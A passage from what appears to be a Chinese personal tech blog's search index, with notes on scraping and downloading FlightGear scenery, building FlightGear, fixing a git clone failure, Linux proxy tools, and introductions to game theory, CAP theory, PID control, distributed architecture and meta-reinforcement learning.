class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;# Lacie# &lt;/a&gt;# and# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link2&quot;&gt;# Tillie# &lt;/a&gt;# ; and they lived at the bottom of a well.# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# ...# &lt;/p&gt;# &lt;/body&gt;# &lt;/html&gt; axel工具axel是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。 axel语法：1axel [options] url1 [url2] [url...] axel选项：123456789101112--max-speed=x , -s x 最高速度x--num-connections=x , -n x 连接数x--output=f , -o f 下载为本地文件f--search[=x] , -S [x] 搜索镜像--header=x , -H x 添加头文件字符串x（指定 HTTP header）--user-agent=x , -U x 设置用户代理（指定 HTTP user agent）--no-proxy ， -N 不使用代理服务器--quiet ， -q 静默模式--verbose ，-v 更多状态信息--alternate ， -a Alternate progress indicator--help ，-h 帮助--version ，-V 版本信息 代码实现获取地景链接12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom bs4 import BeautifulSoup# 下载指定URI链接def getUriContent(uri): try: fgWorldScenery = requests.get(link, timeout=10) except requests.exceptions.HTTPError as errh: print (&quot;Http Error:&quot;,errh) except requests.exceptions.ConnectionError as errc: print (&quot;Error Connecting:&quot;,errc) except requests.exceptions.Timeout as errt: print (&quot;Timeout Error:&quot;,errt) except requests.exceptions.RequestException as err: print (&quot;OOps: Something Else&quot;,err) else: print(&quot;Http Request Success!&quot;) return fgWorldScenery.text# 获取所有地景链接，存入列表def getTargetLinks(html): soup = BeautifulSoup(html) list=[] #print(soup.prettify()) for child in soup.find_all(&apos;area&apos;): list.append(child[&apos;href&apos;]) print(&quot;Get Target Links Success!&quot;) return list# 将地景链接逐行写入文件def writeToFile(linkList): file = open(&apos;./sceneLink.txt&apos;,&apos;w&apos;) for link in linkList: file.write(link) file.write(&apos;\t\n&apos;) print(&quot;Write Target Link To File Success!&quot;) file.close()if __name__ == &quot;__main__&quot;: link = &quot;http://www.flightgear.org/legacy-Downloads/scenery-v2.12.html&quot; html=getUriContent(link) linkList=getTargetLinks(html) writeToFile(linkList) 下载世界地景1234for line in $(cat sceneLink.txt)do axel -n 10 $linedone 参考链接 requests快速上手,by requests. Python 基础教程, by runoob. Python之父教你写main()函数,by 编程派. Beautiful Soup 4.2.0 文档,by BeautifulSoup. FlightGear安装飞机和场景的方法,by jack huang. axel命令,by Linux命令大全.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git_Clone大项目超过1G失败解决方案]]></title>
    <url>%2F2019%2F03%2F09%2FGit-Clone%E5%A4%A7%E9%A1%B9%E7%9B%AE%E8%B6%85%E8%BF%871G%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[SourceForge.net，又称SF.net，是开源软件的开发者进行开发管理的集中式场所，也是全球最大开源软件开发平台和仓库。FlightGear的源代码就托管在该平台。最近在使用Git克隆FlightGear的子项目fgdata时，老是到1G时失败。具体情况如下： 123456789# git clone fgdata大项目时超过1G就会出错$ git clone https://git.code.sf.net/p/flightgear/fgdataCloning into &apos;fgdata&apos;...remote: Counting objects: 61455, done.remote: Compressing objects: 100% (27321/27321), done.error: RPC failed; curl 56 GnuTLS recv error (-110): The TLS connection was non-properly terminated.fatal: The remote end hung up unexpectedlyfatal: early EOFfatal: index-pack failed 经多种方案尝试，使用如下方法可避免该问题：1$ git clone git://git.code.sf.net/p/flightgear/fgdata 参考链接 FGdata downloading error,by flightgear forum. SourceForge Support,by sourceforge. git clone 太慢怎么办？, by aneasystone.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flightgear在Linux/Debian中的下载编译安装教程]]></title>
    <url>%2F2019%2F03%2F08%2FFlightgear%E5%9C%A8Linux-Debian%E4%B8%AD%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[编译安装使用如下脚本在Linux/Debian操作系统下从源代码构建开源飞行模拟器FlightGear.123456789cd &lt;your working directory for building FlightGear&gt;wget -O download_and_compile.sh http://sourceforge.net/p/flightgear/fgmeta/ci/next/tree/download_and_compile.sh?format=rawchmod +x download_and_compile.shmkdir -p stablemkdir -p nextcd stable../download_and_compile.sh -scd ../next../download_and_compile.sh -p n 需要注意的是，该脚本git clone fgdata时超过1G时就会报错退出，解决方案见链接4。 此外，如果之前安装过FlightGear的旧版本，编译过程也有可能报错，清理之前旧版本之后即可解决问题。 启动模拟器启动FlightGear命令如下：123cd &lt;your working directory for building FlightGear&gt;cd stable./run_fgfs.sh fgfs常用选项fgfs为flightgear的飞行模拟器主程序，在命令行中输入fgfs —launcher即可打开启动器，选择飞机、位置等配置，然后开始模拟飞行。下面介绍fgfs的一些常用选项。 —launcher 打开启动器。 —fg-root=path 告诉flightgear到path下寻找数据文件，如飞机、地景等。 —fg-scenery=path 告诉flightgear到path下寻找地景文件。 —fg-aircraft=path 告诉flightgear到path下寻找飞机文件。 —language=code 指定会话语音， 例如 pl, nl, it, fr, en, de。 —aircraft= 飞行器 载入特定飞行器。 —show-aircraft 打印可用的飞行器列表。 参考链接 Howto:Get Local Copies of Flightgear Source Code,by flightgear wiki. Scripted Compilation on Linux Debian/Ubuntu, by flightgear wiki. Building FlightGear,by flightgear wiki. Git_Clone大项目超过1G失败解决方案 ,by jack huang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博弈论简介]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%8D%9A%E5%BC%88%E8%AE%BA%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[博弈论（英语：game theory），又译为对策论，经济学的一个分支，1944年冯·诺伊曼与奥斯卡·摩根斯特恩合著《博弈论与经济行为》，标志着现代系统博弈理论的的初步形成，因此他被称为“博弈论之父”。博弈论被认为是20世纪经济学最伟大的成果之一。目前在生物学、经济学、国际关系、计算机科学、政治学、军事战略和其他很多学科都有广泛的应用。 概述博弈论考虑游戏中的个体的预测行为和实际行为，并研究它们的优化策略。表面上不同的相互作用可能表现出相似的激励结构（incentive structure），所以它们是同一个游戏的特例。其中一个有名有趣的应用例子是囚徒困境。 具有竞争或对抗性质的行为称为博弈行为。在这类行为中，参加斗争或竞争的各方各自具有不同的目标或利益。为了达到各自的目标和利益，各方必须考虑对手的各种可能的行动方案，并力图选取对自己最为有利或最为合理的方案。比如日常生活中的下棋，打牌等。博弈论就是研究博弈行为中斗争各方是否存在着最合理的行为方案，以及如何找到这个合理的行为方案的数学理论和方法。 分类 图1 博弈论知识结构 动态博弈动态博弈是指参与人的行动有先后顺序，而且行动在后者可以观察到行动在先者的选择，并据此作出相应的选择。 静态博弈静态博弈是指博弈中参与者同时采取行动，或者尽管参与者行动的采取有先后顺序，但后行动的人不知道先采取行动的人采取的是什么行动。 完全信息静态博弈纳什均衡纳什均衡，又称为非合作博弈均衡，是博弈论的一个重要术语，以约翰·纳什命名。在一个博弈过程中，无论对方的策略选择如何，当事人一方都会选择某个确定的策略，则该策略被称作支配性策略。如果两个博弈的当事人的策略组合分别构成各自的支配性策略，那么这个组合就被定义为纳什均衡。 术语 局中人（players）：在一场竞赛或博弈中，每一个有决策权的参与者成为一个局中人。只有两个局中人的博弈现象称为“两人博弈”，而多于两个局中人的博弈称为 “多人博弈”。 策略（strategies）：一局博弈中，每个局中人都有选择实际可行的完整的行动方案，即方案不是某阶段的行动方案，而是指导整个行动的一个方案，一个局中人的一个可行的自始至终全局筹划的一个行动方案，称为这个局中人的一个策略。如果在一个博弈中局中人都总共有有限个策略，则称为“有限博弈”，否则称为“无限博弈”。 得失（payoffs）：一局博弈结局时的结果称为得失。每个局中人在一局博弈结束时的得失，不仅与该局中人自身所选择的策略有关，而且与全局中人所取定的一组策略有关。所以，一局博弈结束时每个局中人的“得失”是全体局中人所取定的一组策略的函数，通常称为支付（payoff）函数。 次序（orders）：各博弈方的决策有先后之分，且一个博弈方要作不止一次的决策选择，就出现了次序问题；其他要素相同次序不同，博弈就不同。 博弈涉及到均衡：均衡是平衡的意思，在经济学中，均衡意即相关量处于稳定值。在供求关系中，某一商品市场如果在某一价格下，想以此价格买此商品的人均能买到，而想卖的人均能卖出，此时我们就说，该商品的供求达到了均衡。所谓纳什均衡，它是一稳定的博弈结果。 参考链接 博弈论,by wikipedia. 博弈论, by 智库百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>博弈论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux代理工具简介]]></title>
    <url>%2F2019%2F02%2F23%2FLinux%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[下面介绍两个Linux代理工具shadowsock和proxychains。 shadowsockShadowsocks可以指一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。当前包使用Python、C、C++、C#、Go语言等编程语言开发，大部分主要实现（iOS平台的除外）采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。Shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。 1234# 安装方法sudo apt-get install shadowsocks# 使用方法nohup /usr/bin/sslocal -c /etc/shadowsocks/server.json proxychainsProxyChains是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。 12345678# 安装配置sudo apt install proxychainssudo gedit /etc/proxychains.confsocks5 127.0.0.1 1080# 使用方法proxychains firefoxtproxychains aria2cproxychains wget 参考链接 Shadowsocks,by wikipedia. SOCKS,by wikipedia. 将 Tor socks 转换成 http 代理,by linux 中国.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式系统的CAP理论简介]]></title>
    <url>%2F2019%2F02%2F17%2F%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9A%84CAP%E7%90%86%E8%AE%BA%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[分布式系统定义 分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统[1]。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。 CAP理论CAP理论：一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。 一致性（Consistency） 可用性（Availability） 分区容错性（Partition Tolerance） 一致性（Consistency）在分布式系统中,是指对于一组服务器,给定一组操作,我们需要一个协议使得最后它们的结果达成一致。更详细的解释就是,当其中某个服务器收到客户端的一组指令时,它必须与其它服务器交流以保证所有的服务器都是以同样的顺序收到同样的指令,这样的话所有的服务器会产生一致的结果,看起来就像是一台机器一样。 分布式系统的一致性算法分为： 弱一致性（最终一致性），例如DNS域名解析。 强一致性，例如主从同步、多数派（读/写）、Paxos、Raft（multi Paxos）、ZAB（multi Paxos）。 可用性（Availability）对于一个可用性的分布式系统，每一个非故障的节点必须对每一个请求作出响应。所以，一般我们在衡量一个系统的可用性的时候，都是通过停机时间来计算的。 通常我们描述一个系统的可用性时，我们说淘宝的系统可用性可以达到5个9，意思就是说他的可用水平是99.999%，即全年停机时间不超过 $(1-0.99999)36524*60 = 5.256 min$ ，这是一个极高的要求。 分区容错性（Partition Tolerance）分布式系统在遇到某节点或网络分区故障的时候，仍然能够对外提供满足一致性和可用性的服务。 好的分区容错性要求能够使应用虽然是一个分布式系统，而看上去却好像是在一个可以运转正常的整体。比如现在的分布式系统中有某一个或者几个机器宕掉了，其他剩下的机器还能够正常运转满足系统需求，或者是机器之间有网络异常，将分布式系统分隔未独立的几个部分，各个部分还能维持分布式系统的运作，这样就具有好的分区容错性。 简单点说，就是在网络中断，消息丢失的情况下，系统如果还能正常工作，就是有比较好的分区容错性。 参考连接 George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013. Zookeeper之分布式系统的一致性算法, by 养兔子的大叔. 分布式计算,by wikipedia. 分布式系统的CAP理论,by HollisChuang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最优化算法之动态规划入门]]></title>
    <url>%2F2019%2F02%2F10%2F%E6%9C%80%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[动态规划（英语：Dynamic programming，简称DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。 动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。 动态规划中包含三个重要子概念： 最优子结构 边界 状态转移公式 对有重叠子问题和最优子结构性质的问题，在建模之后，即获得其状态转移公式和边界之后，可采用下列算法求解： 递归求解 备忘录算法 动态规划求解 参考链接 动态规划,by wikipedia. 漫画：什么是动态规划？,by 程序员小灰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PID控制算法原理分析]]></title>
    <url>%2F2019%2F02%2F09%2FPID%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[最近研究深度强化学习算法，进而对控制理论感兴趣，发现了PID这个广泛使用的控制算法。大概了解记录一下。PID控制器（比例-积分-微分控制器），由比例单元(P)、积分单元(I)和微分单元(D)组成。透过Kp，Ki和Kd三个参数的设定。PID控制器主要适用于基本上线性，且动态特性不随时间变化的系统。 图1 PID控制器的方块图 PID是以它的三种纠正算法而命名。受控变数是三种算法（比例、积分、微分）相加后的结果，即为其输出，其输入为误差值（设定值减去测量值后的结果）或是由误差值衍生的信号。若定义 $u(t)$为控制输出，PID算法可以用下式表示： {u}(t)= {MV}(t)=K_{p}e(t)+K_i\int _{0}^{t}{e(\tau )}{d\tau }+K_d{\frac{d}{dt}}e(t)其中: $K_{p}$：比例增益，是调适参数 $K_{i}$：积分增益，也是调适参数 $K_{d}$：微分增益，也是调适参数 $e$：误差=设定值（SP）- 回授值（PV） $t$：目前时间 $\tau$ ：积分变数，数值从0到目前时间 $t$ 参考链接 PID控制器,by wikipedia. PID控制算法原理（抛弃公式，从本质上真正理解PID控制）,by 确定有穷自动机.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式系统架构入门]]></title>
    <url>%2F2019%2F02%2F01%2F%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[随着互联网高速公路的不断发展，以往的单机应用系统逐渐没落，分布式系统逐渐成为主流。 分布式系统定义分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统[1]。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。 现代分布式系统的例子有： Web搜索 大型多人在线游戏 金融交易 分布式系统架构演变大多数的开发者最开始接触的是单机系统架构，即所有的数据和程序都在一台计算机上，这是分布式系统架构演变的起点。随着用户规模的不断增长和用户需求的不断变化，分布式系统架构开始不断演变。 系统架构演化历程-初始阶段架构 初始阶段的小型系统中应用程序、数据库、文件等所有的资源都在一台服务器上。随着业务量的增长，小型系统的负载将越来越重。但如果没有达到单台机器的性能瓶颈，则根本没必要进行分布式架构，可以考虑机器升级，提高机器配置解决问题。或者考虑技术升级，更换更加高效或者场景适合的技术。 系统架构演化历程-应用服务和数据服务分离 数据量增加，单台服务器性能及存储空间不足，需要将应用和数据分离，并发处理能力和数据存储空间得到了很大改善。 系统架构演化历程-使用缓存改善性能 系统访问特点遵循二八定律，即80%的业务访问集中在20%的数据上。缓存分为本地缓存和远程分布式缓存，本地缓存访问速度更快但缓存数据量有限，同时存在与应用程序争用内存的情况。 系统架构演化历程-使用应用服务器集群 使用集群是系统解决高并发、海量数据问题的常用手段。通过向集群中追加资源，提升系统的并发处理能力，使得服务器的负载压力不再成为整个系统的瓶颈。 系统架构演化历程-数据库读写分离 数据库访问通常是读多写少。针对这个情况，就是写一个主库，但是主库挂多个从库，然后从多个从库来读，以支撑更高的读并发压力。 系统架构演化历程-反向代理和CDN加速 为了应付复杂的网络环境和不同地区用户的访问，通过CDN和反向代理加快用户访问的速度，同时减轻后端服务器的负载压力。CDN与反向代理的基本原理都是缓存。 系统架构演化历程-分布式文件系统和分布式数据库 任何强大的单一服务器都满足不了大型系统持续增长的业务需求，数据库读写分离随着业务的发展最终也将无法满足需求，需要使用分布式数据库及分布式文件系统来支撑。分布式数据库是系统数据库拆分的最后方法，只有在单表数据规模非常庞大的时候才使用，更常用的数据库拆分手段是业务分库，将不同的业务数据库部署在不同的物理服务器上。 系统架构演化历程-使用NoSQL和搜索引擎 随着业务越来越复杂，对数据存储和检索的需求也越来越复杂，系统需要采用一些非关系型数据库如NoSQL和分数据库查询技术如搜索引擎。应用服务器通过统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。 系统架构演化历程-业务拆分 为了应对日益复杂的业务场景，通常使用分而治之的手段将整个系统业务分成不同的产品线，应用之间通过超链接建立关系，也可以通过消息队列进行数据分发，当然更多的还是通过访问同一个数据存储系统来构成一个关联的完整系统。 纵向拆分：将一个大应用拆分为多个小应用，如果新业务较为独立，那么就直接将其设计部署为一个独立的Web应用系统纵向拆分相对较为简单，通过梳理业务，将较少相关的业务剥离即可。 横向拆分：将复用的业务拆分出来，独立部署为分布式服务，新增业务只需要调用这些分布式服务横向拆分需要识别可复用的业务，设计服务接口，规范服务依赖关系。 系统架构演化历程-分布式服务 分布式服务关键技术分布式服务应用将会面临以下问题： 当服务越来越多时，服务URL配置管理变得非常困难，硬件负载均衡器的单点压力也越来越大。 当进一步发展，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。 接着，服务的调用量越来越大，服务的容量问题就暴露出来，这个服务需要多少机器支撑？什么时候该加机器？ 服务多了，沟通成本也开始上升，调某个服务失败该找谁？服务的参数都有什么约定？ 一个服务有多个业务消费者，如何确保服务质量？ 随着服务的不停升级，总有些意想不到的事发生，比如cache写错了导致内存溢出，故障不可避免，每次核心服务一挂，影响一大片，人心慌慌，如何控制故障的影响面？服务是否可以功能降级？或者资源劣化？ 为解决上述问题，可采用以下关键技术。 消息队列架构消息对列通过消息对象分解系统耦合性，不同子系统处理同一个消息。 面向服务架构服务框架通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用服务框架是一个点对点模型服务框架面向同构系统适合：移动应用、互联网应用、外部系统。 服务总线架构服务总线架构同面向服务架构一样，均是通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用。服务总线架构是一个总线式的架构模型。 分布式系统交互的通信模式分布式系统交互的通信模式共有五种： request/response模式（同步模式）：客户端发起请求一直阻塞到服务端返回请求为止。 Callback（异步模式）：客户端发送一个RPC请求给服务器，服务端处理后再发送一个消息给消息发送端提供的callback端点，此类情况非常合适以下场景：A组件发送RPC请求给B，B处理完成后，需要通知A组件做后续处理。 Future模式：客户端发送完请求后，继续做自己的事情，返回一个包含消息结果的Future对象。客户端需要使用返回结果时，使用Future对象的.get(),如果此时没有结果返回的话，会一直阻塞到有结果返回为止。 Oneway模式：客户端调用完继续执行，不管接收端是否成功。 Reliable模式：为保证通信可靠，将借助于消息中心来实现消息的可靠送达，请求将做持久化存储，在接收方在线时做送达，并由消息中心保证异常重试。 常用的分布式服务框架现在业界比较成熟的服务框架有很多，比如：Hessian、CXF、Dubbo、Dubbox、Spring Cloud、gRPC、thrift等技术实现，都可以进行远程调用。 Spring Cloud：Spring全家桶，用起来很舒服，只有你想不到，没有它做不到。可惜因为发布的比较晚，国内还没出现比较成功的案例，大部分都是试水，不过毕竟有Spring作背书，还是比较看好。 Dubbox：相对于Dubbo支持了REST，估计是很多公司选择Dubbox的一个重要原因之一，但如果使用Dubbo的RPC调用方式，服务间仍然会存在API强依赖，各有利弊，懂的取舍吧。 Thrift：如果你比较高冷，完全可以基于Thrift自己搞一套抽象的自定义框架吧。 Montan：可能因为出来的比较晚，目前除了新浪微博16年初发布的， Hessian：如果是初创公司或系统数量还没有超过5个，推荐选择这个，毕竟在开发速度、运维成本、上手难度等都是比较轻量、简单的，即使在以后迁移至SOA，也是无缝迁移。 rpcx/gRPC：在服务没有出现严重性能的问题下，或技术栈没有变更的情况下，可能一直不会引入，即使引入也只是小部分模块优化使用。 参考链接 George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013. 聊聊分布式系统的架构套路,by 大蕉. 分布式架构的演进,by 稳稳的幸福y. 互联网 Java 工程师进阶知识完全扫盲,by dooc. 聊聊Dubbo（一）：为何选择, by 猿码道. “12306”的架构到底有多牛逼？,by 绘你一世倾城.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[元强化学习研究笔记]]></title>
    <url>%2F2019%2F01%2F27%2F%E5%85%83%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[元强化学习定义什么是元强化学习？这得从深度学习开始说起。 Deep Learning研究一个从x到y的映射mapping，只是这个映射函数f是用一个端到端的深度神经网络来表示。如果是计算机视觉中的图像识别，那么x就是图片，y就是标签；如果是自然语言处理中的文本翻译，那么x就是比如中文，y就是英文；如果是深度增强学习中的玩Atari游戏，那么x就是屏幕画面，y就是输出的动作。深度学习研究的就是通过深度神经网络来学习一个针对某一特定任务task的模型。通过大量的样本进行训练，训练完，这个模型就可以用在特定任务上。 而Meta Learning研究Task！Meta Learning的目的是希望学习很多很多的task，然后有了这些学习经验之后，在面对新的task的时候可以游刃有余，学的快又学的好！那为什么叫Meta呢？Deep Learning是在Task里面研究，现在Meta Learning是在Task外面，更高层级来研究。也就是在Meta Learning的问题上，Task是作为样本来输入的。 Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向，核心的想法就是希望AI在学习大量的RL任务中获取足够的先验知识Prior Knowledge然后在面对新的RL任务时能够 学的更快，学的更好，能够自适应新环境！ 元强化学习意义元强化学习试图解决深度强化学习存在的如下问题： 它的样本利用率非常低。换言之为了让模型的表现达到一定高度需要极为大量的训练样本。 最终表现很多时候不够好。在很多任务上用非强化学习甚至非学习的其它方法，如基于模型的控制（model based control），线性二次型调节器（Linear Quadratic Regulator）等等可以获得好得多的表现。最气人的是这些模型很多时候样本利用率还高。当然这些模型有的时候会有一些假设比如有训练好的模型可以模仿，比如可以进行蒙特卡洛树搜索等等。 DRL成功的关键离不开一个好的奖励函数（reward function），然而这种奖励函数往往很难设计。在Deep Reinforcement Learning That Matters作者提到有时候把奖励乘以一个常数模型表现就会有天和地的区别。但奖励函数的坑爹之处还不止如此。奖励函数的设计需要保证： 加入了合适的先验，良好的定义了问题和在一切可能状态下的对应动作。坑爹的是模型很多时候会找到作弊的手段。Alex举的一个例子是有一个任务需要把红色的乐高积木放到蓝色的乐高积木上面，奖励函数的值基于红色乐高积木底部的高度而定。结果一个模型直接把红色乐高积木翻了一个底朝天。仔啊，你咋学坏了，阿爸对你很失望啊。 奖励函数的值太过稀疏。换言之大部分情况下奖励函数在一个状态返回的值都是0。这就和我们人学习也需要鼓励，学太久都没什么回报就容易气馁。都说21世纪是生物的世纪，怎么我还没感觉到呢？21世纪才刚开始呢。我等不到了啊啊啊啊啊。 有的时候在奖励函数上下太多功夫会引入新的偏见（bias）。 要找到一个大家都使用而又具有好的性质的奖励函数。这里Alex没很深入地讨论，但链接了一篇陶神（Terence Tao）的博客，大家有兴趣可以去看下。 局部最优/探索和剥削（exploration vs. exploitation）的不当应用。Alex举的一个例子是有一个连续控制的环境里，一个类似马的四足机器人在跑步，结果模型不小心多看到了马四脚朝天一顿乱踹后结果较好的情况，于是你只能看到四脚朝天的马了。 对环境的过拟合。DRL少有在多个环境上玩得转的。你训练好的DQN在一个Atari game上work了，换一个可能就完全不work。即便你想要做迁移学习，也没有任何保障你能成功。 不稳定性。 读DRL论文的时候会发现有时候作者们会给出一个模型表现随着尝试random seed数量下降的图，几乎所有图里模型表现最终都会降到0。相比之下在监督学习里不同的超参数或多或少都会表现出训练带来的变化，而DRL里运气不好可能很长时间你模型表现的曲线都没有任何变化，因为完全不work。 即便知道了超参数和随机种子，你的实现只要稍有差别，模型的表现就可以千差万别。这可能就是Deep Reinforcement Learning That Matters一文里John Schulman两篇不同文章里同一个算法在同一个任务上表现截然不同的原因。 即便一切都很顺利，从我个人的经验和之前同某DRL研究人员的交流来看只要时间一长你的模型表现就可能突然从很好变成完全不work。原因我不是完全确定，可能和过拟合和variance过大有关。 元强化学习方法Meta RL（Meta Reinforcement Learning）是Meta Learning应用到Reinforcement Learning的一个研究方向。因此元强化学习的研究借鉴了元学习的思想和方法。 元学习方法HyperNetwork 生成参数HyperNetwork是一个蛮有名的网络，简单说就是用一个网络来生成另外一个网络的参数。那么我们这里非常直接，我们的设想就是希望用一个hypernetwork输入训练集数据，然后给我输出我的对应模型也就是上图f的参数，我们希望输出的这个参数能够使得在测试图片上取得好的识别效果。那么，有了这样设计，这个hypernetwork其实就是一个meta network。大家可以看到，本来基本的做法是用训练集直接训练这个模型f，但是现在我们用这个hypernetwork不训练了，直接给你输出参数，这等价于hypernetwork学会了如何学习图像识别，这也是为什么meta learning也同时叫做learning to learn的原因。我们通过hypernetwork学会学习。训练好了这个模型，连反向传播梯度下降都不要了，直接给你参数，是不是很酷？ Conditional Neural Network 条件神经网络直接把D_train当做条件输入到f中，那么这个f本身就变成一个meta network了。也就是条件神经网络实际上能够得到和上面的hypernetwork一样的意义。因为我们可以想，只要条件D_train变了，那么y_test肯定也就变了。所以这里就非常非常直接了。把数据全部输入进去，让神经网络自己学就行了，不外乎就是去设计一个合适的网络结构而已。那么，这里最最简单粗暴的网络结构就是SNAIL算法使用temporal convolutional network，也就是wavenet的架构： MAML 基于梯度的做法MAML的核心步骤就是 采集Task，得到D_train和D_test 使用D_train对神经网络f训练少数几步，得到新的参数 利用新的参数训练D_test，然后使得梯度下降更新一开始的参数。 三种解决办法的优缺点先说HyperNetwork生成参数的做法。这种做法最大的问题就在于参数空间是很大的，所以要生成合适的参数特别是巨量的参数其实是比较困难的，所以目前绝大多数生成参数的做法都是只生成少量参数，比如一层的MLP，或者对于参数的空间进行一定的限制，比如就在[-1,1]之间，否则空间太多，有无数种选择输出一样的结果，就很难训了。但是采样HyperNetwork又有其灵活性，意味着我们可以只更新少部分参数，而不用全部。 接下来就是条件神经网络了。这又有什么问题呢？我觉得在性能上绝对会是最好的，很直接，但是不好看，一直要拖着一个条件，网络很大。不管是生成参数还是MAML，他们的模型网络就是独立的，之后只要输入x就行了，而条件神经网络每次都要输入条件，很烦啊。 那么MAML呢？可能最烦人的就是二次梯度了，这意味着MAML的训练会很慢，那么就很难hold住大网络了。实际上MAML目前对于大的网络结构比如Resnet效果并不好。然后MAML是使用D_train的Loss来更新整个网络，对比HyperNetwork缺少灵活性。这个Loss就是最好的吗？不见得。如果D_train是无监督数据，那怎么办？所以MAML是有局限性的。 目前各种各样的Meta Learning研究，在方法论上都逃不出这三种方法。要么改改网络结构，要么结合一下上面的方法，比如先MAML再生成参数，或者hypernetwork和conditional neural network混着用等等。那么什么才是终极必杀呢？可能还是要具体问题具体看吧，对于不同的问题采用不同办法效果会不一样。这些都值得我们去探索。 元强化学习方法参考链接 Meta Learning单排小教学,by Flood Sung. 最前沿: Meta RL论文解读,by Flood Sung. 这里有一篇深度强化学习劝退文,by Frankenstein. 周志华：满足这三大条件，可以考虑不用深度神经网络,by 周志华教授.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[依赖注入入门]]></title>
    <url>%2F2019%2F01%2F26%2F%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
